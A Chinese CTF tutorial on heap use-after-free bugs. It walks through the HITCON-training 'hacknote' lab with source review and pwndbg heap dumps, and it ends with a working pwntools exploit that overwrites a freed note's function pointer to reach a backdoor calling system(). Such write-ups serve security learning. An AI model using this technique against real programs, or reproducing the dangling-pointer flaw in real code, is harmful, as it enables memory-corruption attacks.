> 附件下载：
>
> 链接：[https://pan.baidu.com/s/19StzpwizVbeyNEcY48XcFQ](https://pan.baidu.com/s/19StzpwizVbeyNEcY48XcFQ)
>
> 提取码：oqlh
>

# 原理
我们将Use After Free翻译过来就是释放后使用：当一个指针所指向的指针块被释放掉之后可以再次被使用，但是这是由要求的，不妨将所有的情况列举出来：

+ chunk被释放之后，其对应的指针被设置为NULL，如果再次使用它，程序就会崩溃。
+ chunk被释放之后，其对应的指针未被设置为NULL，如果在下一次使用之前没有代码对这块内存进行修改，那么再次使用这个指针时**程序****很有可能****正常运转**。
+ 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。

在堆中Use After Free一般指的是后两种漏洞，**我们一般称****<font style="color:#F5222D;">被释放后没有被设置为NULL的内存指针</font>****为dangling pointer（悬空指针、悬垂指针）。**

> **未被初始化过的内存指针称为野指针**
>

借用一下CTF-wiki上的例子：

```c
#include <stdio.h>
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { 
    printf("%s\n", str); 
}
void printmyname() { 
    printf("call print my name\n"); 
}
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it"); //此处注意，free之后程序仍然可以正常运行
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this program will crash...\n");
  a->func("can not be printed...");
}
```

保存为test.c，使用gcc进行编译：gcc test.c -g -o test。

编译完成之后运行程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600433810763-204e7201-e33e-47d1-a57c-3f167b6c52b5.png)

# 示例
## 检查文件保护
这里以HITCON-training 中的 lab 10 hacknote为例进行讲解：

将文件下载下来，首先检查一下文件保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600484387687-04151905-765f-4800-8efd-6754f37168a1.png)

可以看到，这是32位程序，开启了Canary保护和NX保护。

## 查看源代码
由于此程序附加的源代码，这次就不使用IDA进行反编译了。

### 查看main函数源代码
```c
int main(){
	setvbuf(stdout,0,2,0);
	setvbuf(stdin,0,2,0);
	char buf[4];
	while(1){
		menu();
		read(0,buf,4);//读入buf
		switch(atoi(buf)){//根据buf来进行选择跳转
			case 1 :
				add_note();//增加笔记
				break ;
			case 2 :
				del_note();//删除笔记
				break ;
			case 3 :
				print_note();//打印指定笔记
				break ;
			case 4 :
				exit(0);
				break ;
			default :
				puts("Invalid choice");
				break ;

		}
	}
	return 0;
}
```

### 查看menu函数源代码
```c
void menu(){
	puts("----------------------");
	puts("       HackNote       ");	
	puts("----------------------");
	puts(" 1. Add note          ");
	puts(" 2. Delete note       ");
	puts(" 3. Print note        ");
	puts(" 4. Exit              ");
	puts("----------------------");
	printf("Your choice :");
};
```

没有什么好说的，这就是一个简单的菜单。

### 查看程序结构体源代码
```c
struct note {
	void (*printnote)();//存放内容
	char *content ;//存储content指针
};

struct note *notelist[5];//存储notelist指针
```

### 查看添加note的源代码
```c
int count = 0; //全局变量note

void print_note_content(struct note *this){
	puts(this->content);
}
void add_note(){
	int i ;
	char buf[8];
	int size ;
	if(count > 5){//判断程序存放的note是否已满
		puts("Full");
		return ;
	}
	for(i = 0 ; i < 5 ; i ++){
		if(!notelist[i]){//note编号是从0开始的
			notelist[i] = (struct note*)malloc(sizeof(struct note));
			if(!notelist[i]){
				puts("Alloca Error");
				exit(-1);
			}
			notelist[i]->printnote = print_note_content;
			printf("Note size :");
			read(0,buf,8);//输入note大小
			size = atoi(buf);
			notelist[i]->content = (char *)malloc(size);
			if(!notelist[i]->content){
				puts("Alloca Error");
				exit(-1);
			}
			printf("Content :");
			read(0,notelist[i]->content,size);//输入note内容
			puts("Success !");
			count++;
			break;
		}
	}
}
```

### 查看删除note的源代码
```c
void del_note(){
	char buf[4];
	int idx ;
	printf("Index :");
	read(0,buf,4);//读入要删除note的序列
	idx = atoi(buf);
	if(idx < 0 || idx >= count){//判断输入note序号的合法性
		puts("Out of bound!");
		_exit(0);
	}
	if(notelist[idx]){
		free(notelist[idx]->content);//free指针所指向的内存区域
		free(notelist[idx]);//未将指针置空，存在UAF漏洞
		puts("Success");
	}
}
```

### 查看打印note的源代码
```c
void print_note(){
	char buf[4];
	int idx ;
	printf("Index :");
	read(0,buf,4);
	idx = atoi(buf);
	if(idx < 0 || idx >= count){
		puts("Out of bound!");
		_exit(0);
	}
	if(notelist[idx]){
		notelist[idx]->printnote(notelist[idx]);
	}
}
```

此函数很简单，不再说。

### 查看magic函数的源代码
值得注意的是，程序中还存在着magic函数：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600485500577-8701009c-8da5-4c19-b5f0-4a37ff741c46.png)

因此我们的目标就是让程序执行magic函数中的system函数。

## pwngdb动态调试
经过上述的步骤相信你已经对程序的大致流程有了了解，接下来我们开始gdb动态调试。

> **<font style="color:#F5222D;">请注意，这是32位程序，并非64位程序，他们的内存布局不相同</font>**
>

### 创建两个note
在gdb中运行程序，创建两个note，输入：

+ note1：size：20；content：note1
+ note2：size：30；content：note2

gdb信息如下：

```c
➜  hacknote_data gdb hacknote 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from hacknote...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/hacknote_data/hacknote 
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :20
Content :note1
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :1
Note size :30
Content :note2
Success !
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :
```

然后ctrl+c进入调试模式，输入heap以查看堆情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600485935801-60615ef8-9ad6-4b2d-872b-2a0a1e117ef0.png)

可以看到堆在内存中的起始地址为：0x804b000，顺便查看一下bin：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600485986192-bf055a96-1a5b-45a0-9725-64ae38349f70.png)

查看堆中的内存：“x/30gx 0x804b000”：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600486101805-f541aaca-0762-4654-a53e-5683253fcacb.png)

由于是32位程序，又是在64位系统下运行的，因此我们这样看内存：

```c
pwndbg> x/30gx 0x804b000
0x804b000:	0x00000011          00000000	//note0_chunk的起始地址
0x804b008   0x0804b018->指向content1 0804865b
0x804b010:	0x00000019->size1  00000000	
0x804b018   0x00000a31          65746f6e    //1eton->note1
0x804b020:	0x00000000          00000000	
0x804b028   0x00000011          00000000    //note1_chunk的起始地址
0x804b030:	0x0804b040->指向content2 0804865b	
0x804b038   0x00000029->size2   00000000
0x804b040:	0x00000a32          65746f6e	//2eton->note2
0x804b048   0x00000000          00000000
0x804b050:	0x00000000          00000000	
0x804b058   0x00000000          00000000
0x804b060:	0x00020fa1          00000000    //top_chunk
0x804b068   0x00000000          00000000
0x804b070:	0x00000000          00000000	
0x804b078   0x00000000          00000000
......
pwndbg> 
```

其中0x804865b地址的详细内容如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600499878203-e2e848f4-dcfa-417e-90d2-d9e4f2fed433.png)

或者是在IDA中来到此地址：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600500835696-93d0847f-1ee8-4bfe-b9e7-85a729296ac8.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600500853168-11ab3fae-ffde-4fc7-9eb9-a821557b65ed.png)

从上面几幅图可以看出，这个地址是puts（printf）函数的起始地址：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600500936477-d881d36c-7758-46e2-b095-6a9a09a2970e.png)

还记得delete函数吗？其中存在着UAF漏洞，部分代码如下：

```c
if(notelist[idx]){
		free(notelist[idx]->content);//free指针所指向的内存区域
		free(notelist[idx]);//未将指针置空，存在UAF漏洞
		puts("Success");
	}
```

也就是说，在free掉内存并未将指针置空，如果在此后仍然使用notelist[idx]（notelist[idx]->content）指针（未更改此片内存区域的数据），那么这个程序很大概率可以正常运行。

因为有UAF漏洞和后门magic函数，因此可以将后门函数写入content，让该context覆盖8字节print_note_content的地址。再打印该chunk的时候，从而执行后门函数。

### 删除两个note
delete note0和note1，详细信息如下：

```powershell
pwndbg> c
Continuing.
2
Index :0
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :2
Index :1
Success
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :^C
Program received signal SIGINT, Interrupt.
0xf7fd7fd9 in __kernel_vsyscall ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────[ REGISTERS ]───────────────────────────────────────
 EAX  0xfffffe00
 EBX  0x0
 ECX  0xffffcfb8 —▸ 0xffff0a32 ◂— 0x0
 EDX  0x4
 EDI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 ESI  0xf7fb8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 EBP  0xffffcfc8 ◂— 0x0
 ESP  0xffffcf88 —▸ 0xffffcfc8 ◂— 0x0
 EIP  0xf7fd7fd9 (__kernel_vsyscall+9) ◂— pop    ebp
────────────────────────────────────────[ DISASM ]─────────────────────────────────────────
 ► 0xf7fd7fd9 <__kernel_vsyscall+9>     pop    ebp
   0xf7fd7fda <__kernel_vsyscall+10>    pop    edx
   0xf7fd7fdb <__kernel_vsyscall+11>    pop    ecx
   0xf7fd7fdc <__kernel_vsyscall+12>    ret    
    ↓
   0xf7edac23 <__read_nocancel+25>      pop    ebx
   0xf7edac24 <__read_nocancel+26>      cmp    eax, 0xfffff001
   0xf7edac29 <__read_nocancel+31>      jae    __syscall_error <__syscall_error>
    ↓
   0xf7e1d740 <__syscall_error>         call   __x86.get_pc_thunk.dx <__x86.get_pc_thunk.dx>
 
   0xf7e1d745 <__syscall_error+5>       add    edx, 0x19a8bb
   0xf7e1d74b <__syscall_error+11>      mov    ecx, dword ptr gs:[0]
   0xf7e1d752 <__syscall_error+18>      neg    eax
─────────────────────────────────────────[ STACK ]─────────────────────────────────────────
00:0000│ esp  0xffffcf88 —▸ 0xffffcfc8 ◂— 0x0
01:0004│      0xffffcf8c ◂— 0x4
02:0008│      0xffffcf90 —▸ 0xffffcfb8 —▸ 0xffff0a32 ◂— 0x0
03:000c│      0xffffcf94 —▸ 0xf7edac23 (__read_nocancel+25) ◂— pop    ebx
04:0010│      0xffffcf98 ◂— 0x0
05:0014│      0xffffcf9c —▸ 0x8048a91 (main+89) ◂— add    esp, 0x10
06:0018│      0xffffcfa0 ◂— 0x0
07:001c│      0xffffcfa4 —▸ 0xffffcfb8 —▸ 0xffff0a32 ◂— 0x0
───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────
 ► f 0 f7fd7fd9 __kernel_vsyscall+9
   f 1 f7edac23 __read_nocancel+25
   f 2  8048a91 main+89
   f 3 f7e1d647 __libc_start_main+247
───────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

查看一下bin：

```powershell
pwndbg> bin
fastbins
0x10: 0x804b028 ◂— 0x29 /* ')' */      second_chunk_start_addr
0x18: 0x804b010 ◂— 0x0                 first_chunk_start_addr
0x20: 0x0
0x28: 0x804b038 ◂— 0x0
0x30: 0x0
0x38: 0x0
0x40: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

可以看到，两个chunk都被回收到了fastbin中，假如说我们现在再次创建一个堆呢？

### 再次创建一个note
再次创建第三个堆：size=8；content="magic"（用此字符串来代替magic函数的地址），可以看一下结果：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1600502088129-074d4a65-6550-476c-aa6a-194029358b70.png)

上面图片的白色区域就是字符串“magic\x0a”的ASCII码。

> 从上图中可以看到，这里写入的“magic”字符串将其他地址覆盖了，不过不要担心，在执行payload时会写入magic函数的真实地址，不会将其他地址进行覆盖。由于我们覆盖的是printf函数的地址，在打印note0的信息时，就会执行system函数。
>

## exp
```c
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./hacknote')

def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)

def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))

def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

#gdb.attach(r)
magic = 0x08048986
addnote(32, "aaaa") # add note 0
addnote(32, "ddaa") # add note 1
delnote(0) # delete note 0
delnote(1) # delete note 1
addnote(8, p32(magic)) # add note 2
printnote(0) # print note 0

r.interactive()
```

